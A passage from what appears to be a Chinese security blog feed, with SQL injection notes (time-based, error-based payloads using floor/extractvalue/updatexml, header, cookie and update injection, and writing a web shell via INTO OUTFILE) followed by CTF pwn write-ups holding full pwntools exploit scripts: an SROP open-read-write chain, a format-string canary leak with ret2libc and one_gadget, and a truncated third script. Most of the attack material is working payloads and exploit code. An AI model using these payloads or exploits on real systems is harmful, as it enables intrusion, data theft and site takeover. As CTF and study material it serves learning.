sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p><p>——</p><p>例如</p><p>判断数据库名长度，成功会延时 3s</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">length</span>(<span class="hljs-name">database</span>())=8,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>) -- +<br></code></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语句的执行结果；</p><p>嵌套的函数中，内部函数先执行；</p><h2 id="报错常用函数"><a href="#报错常用函数" class="headerlink" title="报错常用函数"></a>报错常用函数</h2><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> cout(*),concat(<span class="hljs-keyword">user</span>(),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br></code></pre></td></tr></table></figure><p>floor()报错注入的原因是 group by 在向临时表插入数据时，由于 rand() 多次计算导致插入临时表时主键重复，从而报错，又因为报错前 concat() 中的 SQL 语句或函数被执行，所以该语句报错且被抛出的主键是 SQL 语句或函数执行后的结果。<br>该函数最大显示长度为64，超过长度可以配合 substr、limit 等函数来显示</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>()),0x7e)))</span>;<br></code></pre></td></tr></table></figure><p>从目标XML中返回包含所查询值的字符串，如果Xpath格式语法书写错误的话，就会报错。</p><p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>()),0x7e),1))</span>;<br></code></pre></td></tr></table></figure><p>updatexml的第二个参数需要Xpath格式的字符串，是用/xxx/xxx/xxx/…这种格式，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出</p><p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><h3 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h3><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>())a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1 and<br></code></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h3 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multipolygon</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">linestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multilinestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br></code></pre></td></tr></table></figure><h1 id="header头注入"><a href="#header头注入" class="headerlink" title="header头注入"></a>header头注入</h1><p>http 请求头 header 中可能会存在一些与数据库有交互的数据，例如 session 持久化需要使用数据库，一些日志系统可能会记录用户访问的ua、referer等信息存放到数据库中</p><p>insert语句</p><p>谨慎些，不要插入太多次，容易造成影响与风险</p><p>——————</p><p>and已经or都可以在注释符无法使用的情况下使得语句恢复正常</p><p>——</p><p>同样没有回显，适合报错注入、</p><p>——————</p><p>sqlmap（容易造成影响）</p><p>可以使用，也可以拿到数据</p><h1 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h1><p>cookie在一些情况下会存放在数据库中， 这种情况将恶意sql拼接到cookie与数据库有交互的参数后执行，就有可能出现sql注入漏洞</p><p>————</p><p>cookie首先要是有效的，要已经登陆进去</p><p>抓包也要已登录</p><p>普通的select</p><p>——————</p><p>sqlmap</p><p>-r</p><h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>——————</p><p>使用update的语句进行注入，在于数据库交互师进行注入</p><p>——</p><p>正常的 update 语句都会在后边跟上 where 限定修改的用户名，但是在进行注入检测时，可能会发生将where username=’admin’ 语句注释掉，导致所有用户密码被修改</p><p>为避免这种情况，在真实的环境中导致数据库全部被篡改，<strong>在update注入时应慎用注释符</strong>，改为 and ‘1’=’1 或or ‘1’=’1 来构建闭合（与右边的‘构成闭合（与#作用相似））（在语句与测试点之间注入），<strong>同时也应慎用 sqlmap工具检测</strong>。同样的，在遇到其它无法使用注释符 – + 、 # 的情况, 可以使用 and ‘a’=’a 或者 or ‘a’=’a 这种方式与右侧闭合符号凑成一对,使sql语句正常执行</p><p>——————</p><p>由于并不返回数据，则比较适合报错查询</p><p>0x7e 波浪号在开头会占用一个字符位置，使用0x2a则没有这种问题</p><p>——————</p><p>update语句在注入前已经定义了一个表，在注入时无法用来看内容</p><h1 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h1><p>当目标站点存在sql注入漏洞时，在一定条件下不仅可以读取数据库中的数据，还可以通过mysql导出文件的功能，向目标站点中写入木马，达到控制整个网站的目的</p><p>一般要写在根目录</p><p>——</p><p>show variables like ‘%secure%’;</p><p> # 查看导出路径配置</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/image.w3e5hpb1u68.webp"></p><p>可以使用相对路径，也可以使用绝对路径</p><p>注意使用两个\，一个会被当作转意符</p><p>——————</p><p>mysql用户有权限：</p><p>MySQL 用户权限简单的理解就是数据库只允许用户做你权利以内的事情,不可以越界。</p><p>比如只允许你执行 select 操作,那么你就不能执行 update 操作。</p><p>执行 LOAD DATA 、 SELECT … INTO OUTFILE 语句和 LOAD_FILE() 函数，这些操作需要用户具有 FILE权限</p><p>——</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/image.7jijdi61lho0.webp"></p><p>——————</p><p>secure_file_priv=””</p><p>mysql.ini 文件中 secure_file_priv 为null表示不允许导出文件到任何位置</p><p> secure_file_priv= 为空表示可以往任意位置导出文件， secure_file_priv=D:\phpstudy_pro\WWW 表示只允许向D:\phpstudy_pro\WWW 目录导出文件</p><p>——————</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure_file_priv%&#x27;</span>; <br><span class="hljs-comment">//查看导出路径</span><br></code></pre></td></tr></table></figure><p>load_file() \ into outfile() 函数对文件的读写操作需要使用绝对路径才能将木马导入到网站所在目录</p><p>——————</p><p>获取网站路径信息</p><p>要猜解网站所在目录</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。</p>]]></content>
    
    
    <categories>
      
      <category>web总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nepctf2023</title>
    <link href="/2023/08/16/nepctf2023/"/>
    <url>/2023/08/16/nepctf2023/</url>
    
    <content type="html"><![CDATA[<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p>在ida中反汇编，看到只有<strong>sigreturn</strong>，<strong>read</strong>,<strong>write</strong>,<strong>open</strong>四个函数可以调用</p><p>是利用<strong>srop</strong>进行的<strong>orw</strong></p><p>利用系统调用执行<strong>sigreturn <strong>，后分别执行</strong>orw</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 seccomp<span class="hljs-literal">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = seccomp<span class="hljs-constructor">_init(0LL)</span>;<br>  seccomp<span class="hljs-constructor">_rule_add(<span class="hljs-params">v1</span>, 2147418112LL, 2LL, 0LL)</span>;<br>  seccomp<span class="hljs-constructor">_rule_add(<span class="hljs-params">v1</span>, 2147418112LL, 1LL, 0LL)</span>;<br>  seccomp<span class="hljs-constructor">_rule_add(<span class="hljs-params">v1</span>, 2147418112LL, 0LL, 0LL)</span>;<br>  seccomp<span class="hljs-constructor">_rule_add(<span class="hljs-params">v1</span>, 2147418112LL, 15LL, 0LL)</span>;<br>  seccomp<span class="hljs-constructor">_load(<span class="hljs-params">v1</span>)</span>;<br>  return <span class="hljs-number">0L</span>L;<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const <span class="hljs-built_in">char</span> **argv, const <span class="hljs-built_in">char</span> **envp)<br>&#123;<br>  <span class="hljs-built_in">char</span> v4<span class="hljs-literal">[<span class="hljs-number">48</span>]</span>; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  seccomp(argc, argv, envp);<br>  syscall(<span class="hljs-number">1L</span>L, <span class="hljs-number">1L</span>L, buf, <span class="hljs-number">48L</span>L);<br>  return syscall(<span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L, v4, <span class="hljs-number">768L</span>L);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意我们使用的是<strong>syscall</strong>函数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=0<br><span class="hljs-attribute">de_bug</span>=0<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node3.anna.nssctf.cn&#x27;,28045)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc-2.27.so&#x27;)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">syscall</span>=0x00000000004005B0<br><span class="hljs-attribute">bss</span>=elf.bss(0x400)<br><span class="hljs-attribute">rdi</span>=0x0000000000400813<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">read_f</span>=SigreturnFrame()<br>read_f.<span class="hljs-attribute">rdi</span>=constants.SYS_read<br>read_f.<span class="hljs-attribute">rsi</span>=0<br>read_f.<span class="hljs-attribute">rdx</span>=bss<br>read_f.<span class="hljs-attribute">rcx</span>=0x400<br>read_f.<span class="hljs-attribute">rip</span>=syscall<br>read_f.<span class="hljs-attribute">rsp</span>=bss+0x8<br><span class="hljs-built_in">print</span>(hex(len(bytes(read_f))))<br><span class="hljs-attribute">p1</span>=cyclic(0x38)+p64(rdi)+p64(0xf)+p64(syscall)+bytes(read_f)<br>sa(<span class="hljs-string">&#x27;welcome to NepCTF2023!&#x27;</span>,p1)<br><span class="hljs-attribute">open0</span>=SigreturnFrame()<br>open0.<span class="hljs-attribute">rdi</span>=2<br>open0.<span class="hljs-attribute">rsi</span>=bss<br>open0.<span class="hljs-attribute">rdx</span>=0<br>open0.<span class="hljs-attribute">rcx</span>=0<br>open0.<span class="hljs-attribute">rip</span>=syscall<br>open0.<span class="hljs-attribute">rsp</span>=bss+0x118<br><span class="hljs-attribute">read0</span>=SigreturnFrame()<br>read0.<span class="hljs-attribute">rdi</span>=0<br>read0.<span class="hljs-attribute">rsi</span>=3<br>read0.<span class="hljs-attribute">rdx</span>=bss-0x100<br>read0.<span class="hljs-attribute">rcx</span>=0x40<br>read0.<span class="hljs-attribute">rip</span>=syscall<br>read0.<span class="hljs-attribute">rsp</span>=bss+0x228<br><span class="hljs-attribute">write0</span>=SigreturnFrame()<br>write0.<span class="hljs-attribute">rdi</span>=1<br>write0.<span class="hljs-attribute">rsi</span>=1<br>write0.<span class="hljs-attribute">rdx</span>=bss-0x100<br>write0.<span class="hljs-attribute">rcx</span>=0x40<br>write0.<span class="hljs-attribute">rip</span>=syscall<br>write0.<span class="hljs-attribute">rsp</span>=bss<br><span class="hljs-attribute">p</span>=b&#x27;./flag&#x27;<br><span class="hljs-attribute">p</span>=p.ljust(8,b&#x27;\x00&#x27;)<br>p+=p64(rdi)+p64(0xf)+p64(syscall)+bytes(open0)<br>p+=p64(rdi)+p64(0xf)+p64(syscall)+bytes(read0)<br>p+=p64(rdi)+p64(0xf)+p64(syscall)+bytes(write0)<br>s(p)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nss刷题记录</title>
    <link href="/2023/07/28/nss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/07/28/nss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="NSSRound-14-Basic-love"><a href="#NSSRound-14-Basic-love" class="headerlink" title="[NSSRound#14 Basic]love"></a>[NSSRound#14 Basic]love</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">io_ch</span>=0<br><span class="hljs-attribute">de_bug</span>=1<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;love&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.anna.nssctf.cn&#x27;,28769)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc.so.6&#x27;)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>urcg = lambda : u64(ru(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-6:].ljust(8, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>pause()<br><span class="hljs-attribute">buf_addr</span>=0x00000000004040C0<br><span class="hljs-attribute">main_addr</span>=0x00000000004012B0<br><span class="hljs-attribute">vuln</span>=0x000000000040125D<br><span class="hljs-attribute">ret</span>=0x000000000040101a<br><span class="hljs-attribute">rdi</span>=0x00000000004013f3<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gadget=[0xe3afe,0xe3b01,0xe3b04]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">p1</span>=b&#x27;%8c%9$hhn%15$p&#x27;<br>sa(<span class="hljs-string">&quot;I want to hear your praise of Toka\n&quot;</span>,p1)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><span class="hljs-attribute">canary</span>=int(rc(16),16)<br><span class="hljs-built_in">print</span>(hex(canary))<br>sleep(0.1)<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*40+p64(canary)+p64(ret)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)<br>sla(<span class="hljs-string">&quot;I know you like him, but you must pass my level\n&quot;</span>,p)<br><span class="hljs-attribute">puts_addr</span>=urcg()<br><span class="hljs-built_in">print</span>(hex(puts_addr))<br>libc.<span class="hljs-attribute">address</span>=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">one</span>=libc.address+gadget[1]<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*40+p64(canary)+p64(ret)+p64(one)<br>sla(<span class="hljs-string">&quot;I know you like him, but you must pass my level\n&quot;</span>,p)<br>sleep(0.2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="2021-鹤城杯-littleof"><a href="#2021-鹤城杯-littleof" class="headerlink" title="[2021 鹤城杯]littleof"></a>[2021 鹤城杯]littleof</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=1<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./littleof&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.anna.nssctf.cn&#x27;,28933)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-comment">#libc=ELF(&#x27;&#x27;)</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">main</span>=0x0000000000400789<br><span class="hljs-attribute">ret</span>=0x000000000040059e<br><span class="hljs-attribute">rdi</span>=0x0000000000400863<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span 